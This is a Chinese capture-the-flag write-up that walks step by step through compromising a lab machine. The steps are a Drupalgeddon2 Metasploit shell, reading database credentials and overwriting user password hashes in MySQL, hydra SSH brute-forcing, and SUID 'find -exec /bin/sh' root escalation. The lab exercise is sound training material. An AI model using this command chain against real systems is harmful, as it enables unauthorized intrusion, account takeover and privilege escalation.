1.
扫描靶机得到IP地址192.168.89.139
​
2.漏洞模块和文件查找
访问网页80端口，使用火绒插件识别服务版本，发现是一个drupal 7的cms管理系统
接着使用msf查找相关漏洞，尝试发现exploit/unix/webapp/drupal_drupalgeddon2 这个模块可以成功获取shell，然后ls 发现flag1.txt这个文件，但实际上没啥用，网上搜索得知是一个配置文件，可以使用
find / -name setting.php，找到这个文件.
​
3.mysql登录
发现文件存在

```bash
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
这里是mysql的登录账号和密码，直接使用mysql -u dbuser -pR0ck3t 登录，接着找到drupaldb库里面的users表，发现存在账号和哈希加密的密码，因为这是drupal的数据库，所以猜测密码应该是登录drupal网站的，但是不知道原始密码，然后这里就去/var/www/scripts文件夹下找到一个password-hash.sh文件，这个实际上是对密码进行hash加密的脚本，那么我们就可以自己构造密码，然后把users表的对应的密码改掉从而实现登录的目的，
​
4. 密码替换
php /var/www/scripts/password-hash.sh password123  ，执行脚本，会生成一段哈希，复制然后使用

```bash
update users set pass='$S$DSZ/3L7CCIJ5n1/d.IEH3UDFlKNazcZmpYXUT7tBF9mBo./LZZfK' where name='admin';
update users set pass='$S$DSZ/3L7CCIJ5n1/d.IEH3UDFlKNazcZmpYXUT7tBF9mBo./LZZfK' where name='Fred';
```
修改，接着登录后发现flag3 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.  ，提示我们passwd文件和shadow文件，显然shadow文件需要管理员权限，那么我们先看passwd，在文件最末尾发现了flag4这个用户，那么我们就尝试登录
​
5.使用ssh爆破尝试登录
直接执行hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.89.139，尝试爆破密码，成功爆出密码[22][ssh] host: 192.168.89.139   login: flag4   password: orange
那么直接登录，ssh flag4@192.168.89.139 登录后找到flag4.txt，其实还是没什么用
​
6.suid提权
排除了其他的提权方法，那么suid提权就是最有可能的了
我们可以先使用find / -perm -u=s -type f 2>/dev/null，找出所有具有suid位的文件，然后进行使用，这里就使用find ，执行find / -name index.php -exec "/bin/sh" \;  就可以成功提权，得到root权限，然后在root目录下得到最终的flag，至此，靶机渗透完成。
